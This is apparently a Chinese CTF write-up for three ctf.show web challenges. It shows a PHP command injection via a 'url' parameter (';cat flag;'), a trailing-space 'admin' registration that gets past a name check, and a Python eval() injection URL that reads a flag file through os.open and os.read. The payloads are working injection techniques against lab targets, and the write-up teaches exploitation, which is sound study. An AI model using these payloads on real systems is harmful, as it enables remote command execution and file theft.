## Web
#### 签到题
```php
<?php 
if(isset($_GET['url'])){
        system("curl https://".$_GET['url'].".ctf.show");
}else{
        show_source(__FILE__);
}
 ?>
```
调用了 system() 这个函数，并且参数可控
尝试 `?url=;ls;` 会显文件，有戏
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583502837-673356-image.png]
```
?url=;cat flag;
```
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583502897-348269-image.png]

签到成功！！！~~流泪~~

----
#### 假赛生
```php
<?php
session_start();
include('config.php');
if(empty($_SESSION['name'])){
    show_source("index.php");
}else{
    $name=$_SESSION['name'];
    $sql='select pass from user where name="'.$name.'"';
    echo $sql."<br />";
    system('4rfvbgt56yhn.sh');
    $query=mysqli_query($conn,$sql);
    $result=mysqli_fetch_assoc($query);
    if($name==='admin'){
        echo "admin!!!!!"."<br />";
        if(isset($_GET['c'])){
            preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
            echo $flag;
        }else{
            echo "you not admin";
        }
    }
}
?>
```
用 admin 随便 login 几下，估计没戏
随便注册一个帐号，提示
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583503169-167119-image.png]

想到曾经见过的一个操作 ~~（我也不知道叫啥）~~
没限制空格，注册一个 admin      （后面加点空格）
然后用这个帐号的密码就能登录 admin
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583503760-795400-image.png]

还要传一个 c，有一个正则式匹配
我真地看不懂，但是阴差阳错空着 c 就提交了
然后 flag 就出来了
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583503845-895931-image.png]

想想也对，没东西能匹配个啥

----
#### 数学及格了
在 main.js 里面找到点东西
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583504065-463074-image.png]
然后乱交了点东西，报错了
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583502627-644438-image.png]
可以看到是用的 python 的 eval() 计算的，就存在漏洞
然后就去找 eval() 的骚操作
然后，各种尝试
发现了 __import__('os') ，开始的时候用的 __import__('os').system('dir') 结果老是 0 
查了资料发现 system() 成功了会返回 0
好吧，换姿势，寻找 os 模块里的其他函数，然后找到了 listdir()
但是，他一直报错 QwQ
然而没有影响，报错的会显有我需要的东西
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583505282-951759-image.png]
然后找到 flag，用 open() 和 read() 读取
```python
http://124.156.121.112:5000/_calculate?number1=1*int(str(__import__('os').read(__import__('os').open('/home/ctf/web/flag',__import__('os').O_RDONLY),30)))
```
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583505430-375170-image.png]


----
## Re

<!--stackedit_data:
eyJoaXN0b3J5IjpbMTI1MDM2MTkxOF19
-->